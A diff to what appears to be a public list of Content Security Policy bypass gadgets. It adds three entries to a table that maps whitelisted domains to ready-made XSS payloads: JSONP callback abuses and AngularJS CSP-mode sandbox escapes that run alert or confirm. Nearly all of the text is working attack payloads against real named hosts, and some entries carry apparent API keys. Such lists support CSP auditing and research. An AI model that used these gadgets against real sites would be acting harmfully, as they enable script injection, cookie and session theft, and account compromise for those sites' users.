@@ -74,6 +74,7 @@ info.elastic.co	<script src="https://info.elastic.co/index.php/form/getForm?munc
 inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 investor.coinbase.com	<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
+js-smb.devices.ovoenergy.com	<body ng-app ng-csp><script src="https://js-smb.devices.ovoenergy.com/js-smb.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 kbcprod.service-now.com	<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 lptag.liveperson.net	<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>
 m.media-amazon.com	<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
@@ -86,6 +87,7 @@ nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/sea
 openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>
 partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>
 passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>
+portal.ayco.com	<body ng-app ng-csp><script src="https://portal.ayco.com/publicBundles/angularjs"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>
 pixel.mathtag.com	<script src="https://pixel.mathtag.com/u/js?callback=alert(1)"></script>
 pixel.quantserve.com	<script src="https://pixel.quantserve.com/api/segments.json?callback=alert"></script>
 pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>
@@ -94,6 +96,7 @@ query.fqtag.com	<script src="https://query.fqtag.com/b?callback=alert(1)"></scri
 r.skimresources.com	<script src="https://r.skimresources.com/api/?callback=alert"></script>
 recaptcha.net	<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>
 reveal.clearbit.com	<script src="https://reveal.clearbit.com/v1/companies/reveal?authorization=pk_5fdce9b9374f2f8a4f8c9f4a1546fa35&callback=alert"></script>
+romania.amazon.com	<body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>
 s.fqtag.com	<script src="https://s.fqtag.com/b?callback=alert(1)"></script>
 s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>
